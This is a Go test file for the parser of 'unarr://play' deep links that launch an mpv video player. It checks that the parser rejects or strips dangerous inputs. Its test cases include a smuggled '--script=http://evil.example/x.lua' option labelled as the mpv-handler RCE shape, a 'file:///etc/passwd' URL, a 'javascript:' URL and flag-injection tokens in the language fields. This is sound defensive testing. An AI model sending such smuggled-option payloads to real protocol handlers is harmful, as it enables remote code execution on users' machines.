package main

import (
	"net/url"
	"reflect"
	"strings"
	"testing"
)

func TestOpenArg(t *testing.T) {
	tests := []struct {
		name   string
		args   []string
		want   string
		wantOK bool
	}{
		{"open flag with url", []string{"--open", "unarr://play?url=x"}, "unarr://play?url=x", true},
		{"open flag equals form", []string{"--open=unarr://play?url=x"}, "unarr://play?url=x", true},
		{"bare scheme arg (%u/%1 substitution)", []string{"unarr://play?url=x"}, "unarr://play?url=x", true},
		{"bare scheme arg uppercase", []string{"UNARR://play?url=x"}, "UNARR://play?url=x", true},
		{"open flag without url still claims the mode", []string{"--open"}, "", true},
		{"no args -> tray mode", nil, "", false},
		{"unrelated flag -> tray mode", []string{"--verbose"}, "", false},
		{"scheme arg with extra args -> tray mode", []string{"unarr://play?url=x", "other"}, "", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := openArg(tt.args)
			if got != tt.want || ok != tt.wantOK {
				t.Errorf("openArg(%v) = (%q, %v), want (%q, %v)", tt.args, got, ok, tt.want, tt.wantOK)
			}
		})
	}
}

// link builds an unarr://play link with the given query params, encoding the
// same way the web does (url.Values), so tests read as intent, not escapes.
func link(params map[string]string) string {
	q := url.Values{}
	for k, v := range params {
		q.Set(k, v)
	}
	return "unarr://play?" + q.Encode()
}

func TestParsePlayURL(t *testing.T) {
	tests := []struct {
		name    string
		raw     string
		want    playRequest
		wantErr string // substring of the expected error; "" = no error
	}{
		{
			name: "full happy path",
			raw: link(map[string]string{
				"url":   "https://cdn.example.com/v.mkv?token=abc",
				"start": "90",
				"title": "My Show S01E02",
				"alang": "es,en",
				"slang": "es",
			}),
			want: playRequest{
				URL:   "https://cdn.example.com/v.mkv?token=abc",
				Start: 90,
				Title: "My Show S01E02",
				ALang: []string{"es", "en"},
				SLang: []string{"es"},
			},
		},
		{
			name: "plain http allowed",
			raw:  link(map[string]string{"url": "http://192.168.1.10:11818/stream/x.mkv"}),
			want: playRequest{URL: "http://192.168.1.10:11818/stream/x.mkv"},
		},
		{
			name:    "file scheme rejected",
			raw:     link(map[string]string{"url": "file:///etc/passwd"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "javascript scheme rejected",
			raw:     link(map[string]string{"url": "javascript:alert(1)"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "data scheme rejected",
			raw:     link(map[string]string{"url": "data:text/html,hi"}),
			wantErr: "must be http(s)",
		},
		{
			// The mpv-handler RCE shape: an option smuggled as the "URL".
			// url.Parse chokes on it ("first path segment cannot contain
			// colon") before the scheme whitelist even runs — either way it
			// must never reach player argv.
			name:    "url that is an mpv option rejected",
			raw:     link(map[string]string{"url": "--script=http://evil.example/x.lua"}),
			wantErr: "unparseable stream url",
		},
		{
			// Same shape without a colon parses as a relative URL with no
			// scheme, so this one exercises the whitelist branch.
			name:    "colonless option-shaped url rejected by whitelist",
			raw:     link(map[string]string{"url": "--fs"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "scheme-relative url rejected",
			raw:     link(map[string]string{"url": "//evil.example/x"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "unparseable stream url rejected",
			raw:     link(map[string]string{"url": "http://exa mple.com/v.mkv"}),
			wantErr: "unparseable stream url",
		},
		{
			name:    "http url without host rejected",
			raw:     link(map[string]string{"url": "http:///path-only"}),
			wantErr: "no host",
		},
		{
			name:    "missing url param",
			raw:     "unarr://play?start=5",
			wantErr: "missing url=",
		},
		{
			name:    "wrong action host rejected",
			raw:     "unarr://config?url=https%3A%2F%2Fx.example%2Fv",
			wantErr: "unsupported action",
		},
		{
			name:    "wrong outer scheme rejected",
			raw:     "mpv://play?url=https%3A%2F%2Fx.example%2Fv",
			wantErr: "unexpected scheme",
		},
		{
			name: "non-numeric start dropped, not fatal",
			raw:  link(map[string]string{"url": "https://x.example/v", "start": "12abc"}),
			want: playRequest{URL: "https://x.example/v"},
		},
		{
			name: "negative start dropped",
			raw:  link(map[string]string{"url": "https://x.example/v", "start": "-5"}),
			want: playRequest{URL: "https://x.example/v"},
		},
		{
			// A flag smuggled into the language list must be dropped, never
			// forwarded — it would otherwise land inside --alang=... argv.
			name: "alang injection tokens dropped",
			raw:  link(map[string]string{"url": "https://x.example/v", "alang": "es,--script=x,en,zz9!,pt-BR"}),
			want: playRequest{URL: "https://x.example/v", ALang: []string{"es", "en", "pt-BR"}},
		},
		{
			name: "slang all invalid -> empty",
			raw:  link(map[string]string{"url": "https://x.example/v", "slang": "--osd-on,1234"}),
			want: playRequest{URL: "https://x.example/v"},
		},
		{
			name: "title control chars stripped",
			raw:  link(map[string]string{"url": "https://x.example/v", "title": "My\x00 Sh\x1bow\n"}),
			want: playRequest{URL: "https://x.example/v", Title: "My Show"},
		},
		{
			name: "overlong title capped",
			raw:  link(map[string]string{"url": "https://x.example/v", "title": strings.Repeat("a", 500)}),
			want: playRequest{URL: "https://x.example/v", Title: strings.Repeat("a", 200)},
		},
		{
			// A raw control character makes url.Parse itself fail (malformed
			// %-escapes in the query would NOT — ParseQuery drops those pairs,
			// which surfaces as "missing url=" instead).
			name:    "unparseable outer link",
			raw:     "unarr://play\x00?url=https://x.example/v",
			wantErr: "unparseable link",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parsePlayURL(tt.raw)
			if tt.wantErr != "" {
				if err == nil {
					t.Fatalf("parsePlayURL(%q) = %+v, want error containing %q", tt.raw, got, tt.wantErr)
				}
				if !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("parsePlayURL(%q) error = %q, want it to contain %q", tt.raw, err, tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("parsePlayURL(%q) unexpected error: %v", tt.raw, err)
			}
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("parsePlayURL(%q) = %+v, want %+v", tt.raw, got, tt.want)
			}
		})
	}
}
